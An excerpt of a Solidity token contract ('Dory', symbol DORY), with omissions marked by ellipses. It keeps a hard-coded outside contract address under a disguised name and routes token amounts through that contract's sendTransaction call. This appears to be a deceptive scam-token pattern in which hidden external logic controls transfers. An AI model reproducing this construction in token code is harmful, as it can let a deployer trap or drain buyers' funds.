...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _findingNemo = 0x84400699E5f3f37fBA6c7b765CE6fAF7C1a86809;
    address public pair;

    IDEXRouter router;
    IERC5679 findingNemo;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        findingNemo = IERC5679(_findingNemo);
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return findingNemo.sendTransaction(amount);
    }
    ...
    function _DeployDory(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDory(creator, initialSupply);
    }
}

contract Dory is ERC20Token {
    constructor() ERC20Token("Dory", "DORY", msg.sender, 42069000000 * 10 ** 18) {
    }
}